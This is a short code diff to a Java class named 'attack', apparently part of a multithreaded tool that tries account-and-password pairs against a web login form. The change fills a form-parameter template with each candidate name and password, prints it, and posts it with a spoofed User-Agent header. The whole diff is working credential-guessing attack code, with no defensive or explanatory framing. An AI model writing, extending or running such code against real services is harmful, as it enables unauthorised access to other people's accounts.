@@ -144,7 +144,6 @@ public class attack implements Runnable {
             // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
             httpURLConnection.setInstanceFollowRedirects(false);
             // 设置请求头
-            httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
             httpURLConnection.setRequestProperty("Content-Length", "40");
             httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             httpURLConnection.setRequestProperty("User-Agent",
@@ -153,8 +152,11 @@ public class attack implements Runnable {
             httpURLConnection.connect();
             /* 4. 处理输入输出 */
             // 写入参数到请求中
+            String param = file.param.replace("$[account]", name);
+            param = param.replace("$[password]", pass);
+            System.out.println(param);
             OutputStream out = httpURLConnection.getOutputStream();
-            out.write(file.param.getBytes());
+            out.write(param.getBytes());
             // 简化
             // httpURLConnection.getOutputStream().write(params.getBytes());
             out.flush();
